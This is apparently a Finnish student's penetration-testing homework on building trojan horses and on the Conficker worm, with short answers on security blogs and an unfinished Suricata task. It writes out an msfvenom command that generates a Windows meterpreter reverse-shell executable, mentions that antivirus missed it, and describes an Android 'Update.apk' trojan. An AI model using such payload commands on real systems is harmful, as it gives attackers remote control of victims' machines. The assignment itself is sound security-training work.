
Pentesting Tehtävä5



1) Tee Troijan hevosia, vähintään kaksi erilaista. Voit tehdä esimerkiksi saastuneen asennusohjelman, dokumentteja, joissa on vihamielisiä makroja sekä älypuhelimen apin. Nimeä ohjelmat siten, että haitallinen tarkoitus ilmenee MALWARE-installer.exe. Vihamielisenä hyötykuormana voi olla esimerkiksi meterpreter. Älä tee itsestään leviäviä ohjelmia. Voit käyttää troijan hevosen tekoon esim. setoolkit, msfvenom.
 

Kuva puhuu puolestaan. Kyseessä on MSFvenom ohjelmalla luotu virus, joka ei tunnistautunut haitalliseksi F-Secure virusskannauksessa.

Itse virus luotiin komennolla:

msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=443 -f exe > reversetcp.exe

JOSSA: 
LHOST=192.168.100.13 oli tietokoneen IP-osoite, jolla virus luotiin, jos viruksen ajaisi se ottaisi yhteyttä koneeseen.  

Miksi Windows näytti tiedoston nimen toisin kuin millä loin sen, jäi vielä auki.


Otetaan toinen yritys ja katsotaan mitä nyt saadaan aikaan:

 

Lopputulos löytyy tiedostona: Update.apk – jonka voisi ajaa Android-laitteessa.
Mutta tulee muistaa, että ei kannata yrittää sähköpostitse mailata virusta pahaa aavistamattomalle Android käyttäjälle ja toivoa, hänen ajavan sitä. Sillä google ajaa tarkistuksia saapuviin sähköposteihin ja hyvin suurella todennäköisyydellä paketti jäisi kiinni tarkistuksessa, vaikka kyse olisikin vain Pentestauksesta.


2) Mitä uusia keksintöjä Confickerissa esiteltiin? Lue jokin artikkeli Confickerista. ‘conficker analysis’ on hyvä hakusana. Kiinnitä huomiosi C2:n.
VASTAUS:

” The exploit employs a specially crafted remote procedure call (RPC) over port 445/TCP, which can cause Windows 2000, XP, 2003 servers, and Vista to execute an arbitrary code segment without authentication.  The exploit can affect systems with firewalls enabled, but which operate with print and file sharing enabled.”

Tietokoneelle mato tunkeutuu joko: MS08-067 haavoittuvuuden kautta tai USB-median kautta.

Conficker oli ohjelmoitu niin että kun tietokone oli tartutettu ja uusiin koneisiin piti saada tartunta local-verkon jälkeen. Conficker ei skannaa internetissä tiettyjä ip-alueita, joihin kuului muun muassa IT-turva-alalle kuuluvia yrityksiä, kuten F-Secure.


Mato loi joka päivä uusia verkko tunnuksia mihin ottaa yhteyttä, sillä sen sijaan että virus/mato ottaisi yhteyttä vain yhteen domainiin, jonka saa alas helposti se luo monia yhteyksiä, joista joku/jotkut ovat oikeita ja täten jäljille pääseminen on vaikeampaa.




3) Blogeja. Etsi Krebsin tai Schneierin blogeista ideoita pentestiin. Näissä blogeissa on paljon turvallisuuteen liittyviä aiheita, tee erityisesti huomioita tunkeutumistestaukseen liittyen.

VASTAUS:

Ensiksi tulee varmistaa, minun kykyni Pentestaajana on valmistaa esimerkiksi troijalaisia ja myös ymmärrystä, kuinka verkon yli voin saada payloadin ladattua ja/tai vihamieliseksi valmistamani App:in testikohteena olevaan puhelimeen, sillä kun tietotaito kasvaa on hyvä ruveta miettimään teknillisiä seikkoja, joita voidaan käyttää meitä vastaan ja kuinka näitä voidaan testata ja myöhemmin paikata.

Toinen mainitsemisen arvoinen seikka on metadata, sitä pidetään usein tois-arvoisena eikä turvallisuuden kannalta uhkana välttämättä laisinkaan.

Perehtymällä siihen miten metadataan pääsee käsiksi ja kuinka sitä käsittelemällä voi kiertää turvallisuutta on yksi hyvä kohta missä voidaan tiukentaa turvallisuuden suhteen.



4) Safarionline. Opettele ja testaa jokin uusi Pentesting-tekniikka kirjasta tai videosta, jonka löydät Safarionlinesta.

VASTAUS:

Suricata IDS: 

Aika loppui kesken.
